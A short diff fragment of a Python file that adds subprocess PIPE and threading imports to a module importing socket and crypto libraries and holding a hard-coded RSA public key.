@@ -3,6 +3,7 @@ import socket
 import random
 import os
 import subprocess
+from subprocess import PIPE
 import string
 from Crypto.PublicKey import RSA
 from Crypto.Cipher import AES
@@ -10,6 +11,7 @@ from Crypto.Hash import SHA256
 import Crypto
 from Crypto.PublicKey import RSA
 from Crypto import Random
+import threading
 
 rsa_str = '-----BEGIN PUBLIC KEY-----\nMIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDwlbp/XRIkDF8sKfjsk3mKpYxI5ljpO1mn+SOvJb/M18AhGzv6ViDDYzwmcFlASiEvnqKdLTC2W6F+mgzhIu8Aft0ZAi2aIJ2yU2TPR5MOxq55vzXulRF71hyy4sJVIXa8Q11XJJyzm5pmkbrmiaCZIOABzyf5WTcbepSq0I6dSQIDAQAB\n-----END PUBLIC KEY-----'
 rsa = RSA.importKey(rsa_str)
